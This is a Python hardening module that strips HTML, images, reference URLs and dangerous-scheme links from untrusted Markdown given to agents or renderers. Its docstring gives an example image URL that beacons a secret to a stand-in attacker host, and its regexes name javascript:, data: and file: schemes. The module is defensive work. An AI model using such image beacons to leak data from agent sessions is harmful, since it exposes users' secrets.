"""Neutralize exfiltration and injection vectors in untrusted Markdown.

When Markdown is returned to an agent or rendered, its most dangerous
feature is auto-rendered images and links: an image such as
`![x](http://attacker/?secret=...)` beacons data out with zero clicks, and
dangerous-scheme links (`javascript:`, `data:`, `file:`) run code or read
local files on one click. Raw embedded HTML reintroduces both. This module
applies a conservative, linear-time transform that strips HTML, defangs
images by dropping their URLs, keeps only http/https links, and neutralizes
dangerous-scheme URIs. It is a hardening transform, not a full renderer.
"""

import re

# All regex patterns are bounded and use negated character classes or a lazy
# bounded quantifier, so they run in linear time and cannot be turned into a
# ReDoS. HTML tags are removed by a single linear scan (_strip_html_tags)
# rather than a regex, so a tag of any length and a tag whose attributes span
# newlines are both stripped without an unbounded or quadratic match.
# Comments are stripped first so a '>' inside a comment body does not end a
# tag early.
_HTML_COMMENT = re.compile(r"<!--[\s\S]{0,4000}?-->")
_IMAGE = re.compile(r"!\[([^\]\n]{0,500})\]\([^)\n]{0,2000}\)")
# Reference-style images beacon just like inline ones: !\[alt\]\[ref\] and the
# shortcut !\[ref\] both resolve to a URL declared in a reference definition.
_IMAGE_REF = re.compile(r"!\[([^\]\n]{0,500})\]\[[^\]\n]{0,200}\]")
_IMAGE_SHORTCUT = re.compile(r"!\[([^\]\n]{0,500})\](?![(\[])")
# Reference definitions carry the URL the references above resolve to, so the
# URL is dropped even when nothing visible references it.
_REF_DEF = re.compile(r"(?m)^([ ]{0,3})\[([^\]\n]{1,200})\]:[ \t]*\S{0,2000}.*$")
_LINK = re.compile(r"\[([^\]\n]{0,500})\]\(([^)\s]{0,2000})\)")
_DANGEROUS_SCHEME = re.compile(r"(?i)(javascript|data|vbscript|file):(?=\S)")

ALLOWED_LINK_SCHEMES = frozenset({"http", "https"})


def _strip_html_tags(text: str) -> str:
    """Remove every '<...>' span in one linear pass.

    A tag's attributes may span newlines and be arbitrarily long, so a bounded
    single-line regex lets '<img\\nsrc=...>' through and a huge tag past its
    cap. Scanning from each '<' to the next '>' drops the whole tag regardless
    of length or embedded newlines; a '<' with no closing '>' is kept as
    literal text. Each character is visited once, so this stays linear.
    """
    out: list[str] = []
    i = 0
    while True:
        start = text.find("<", i)
        if start == -1:
            out.append(text[i:])
            break
        out.append(text[i:start])
        end = text.find(">", start + 1)
        if end == -1:
            out.append(text[start:])
            break
        i = end + 1
    return "".join(out)


def sanitize_markdown(text: str) -> str:
    """Return Markdown with HTML stripped and exfiltration vectors removed."""
    text = _HTML_COMMENT.sub("", text)
    text = _strip_html_tags(text)
    text = _IMAGE.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _IMAGE_REF.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _IMAGE_SHORTCUT.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _REF_DEF.sub(lambda m: f"{m.group(1)}[{m.group(2)}]: (link removed)", text)
    text = _LINK.sub(_sanitize_link, text)
    text = _DANGEROUS_SCHEME.sub(lambda m: m.group(1) + "-scheme-blocked:", text)
    return text


def _sanitize_link(match: re.Match) -> str:
    label = match.group(1)
    url = match.group(2).strip()
    scheme = url.split(":", 1)[0].lower() if ":" in url else ""
    # A relative link has no scheme and is safe; an http/https link is kept
    # but a caller can still see it. Any other scheme drops to plain text.
    if scheme and scheme not in ALLOWED_LINK_SCHEMES:
        return f"[{label}]"
    return f"[{label}]({url})"
